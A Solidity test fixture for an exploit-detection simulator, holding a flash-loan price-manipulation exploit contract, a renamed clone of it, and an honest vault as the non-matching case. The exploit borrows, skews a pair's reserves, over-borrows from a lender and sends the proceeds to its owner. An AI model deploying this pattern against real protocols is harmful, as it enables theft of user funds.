// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// TEST ONLY (test/immune*.test.js, helpers/immunesim.js): the runtime code of an exploit, a clone of it as an
// attacker would redeploy it elsewhere (new owner, new lender, a renamed entry point, one extra function), and
// an honest contract that must never match. Never deployed anywhere real; nothing here is executed against a
// real protocol (the mock chains only carry the code and the logs).

interface IKFlashPool { function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 code) external; }
interface IKPair { function swap(uint256 a0, uint256 a1, address to, bytes calldata data) external; function sync() external; function getReserves() external view returns (uint112, uint112, uint32); }
interface IKToken { function transfer(address to, uint256 v) external returns (bool); function balanceOf(address a) external view returns (uint256); function approve(address s, uint256 v) external returns (bool); }
interface IKLending { function borrow(address asset, uint256 amount) external; function depositCollateral(address asset, uint256 amount) external; }

contract FlashExploit {
    address public immutable owner;
    address public constant POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    constructor() { owner = msg.sender; }

    function attack(address token, uint256 amount, address pair, address lending) external {
        require(msg.sender == owner, "no");
        IKFlashPool(POOL).flashLoanSimple(address(this), token, amount, abi.encode(pair, lending), 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata p) external returns (bool) {
        (address pair, address lending) = abi.decode(p, (address, address));
        IKToken(asset).transfer(pair, amount / 2);
        IKPair(pair).swap(0, amount, address(this), "");
        IKToken(asset).approve(lending, type(uint256).max);
        IKLending(lending).depositCollateral(asset, amount / 4);
        IKLending(lending).borrow(asset, amount * 3);
        IKPair(pair).sync();
        IKToken(asset).approve(POOL, amount + premium);
        return true;
    }

    function withdraw(address token) external {
        require(msg.sender == owner, "no");
        IKToken(token).transfer(owner, IKToken(token).balanceOf(address(this)));
    }
}

contract FlashExploitClone {
    address public immutable owner;
    address public constant POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;

    constructor() { owner = msg.sender; }

    function go(address token, uint256 amount, address pair, address lending) external {
        require(msg.sender == owner, "no");
        IKFlashPool(POOL).flashLoanSimple(address(this), token, amount, abi.encode(pair, lending), 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata p) external returns (bool) {
        (address pair, address lending) = abi.decode(p, (address, address));
        IKToken(asset).transfer(pair, amount / 2);
        IKPair(pair).swap(0, amount, address(this), "");
        IKToken(asset).approve(lending, type(uint256).max);
        IKLending(lending).depositCollateral(asset, amount / 4);
        IKLending(lending).borrow(asset, amount * 3);
        IKPair(pair).sync();
        IKToken(asset).approve(POOL, amount + premium);
        return true;
    }

    function withdraw(address token) external {
        require(msg.sender == owner, "no");
        IKToken(token).transfer(owner, IKToken(token).balanceOf(address(this)));
    }

    function ping() external pure returns (uint256) { return 42; }
}

contract HonestVault {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send");
        emit Withdraw(msg.sender, amount);
    }
}
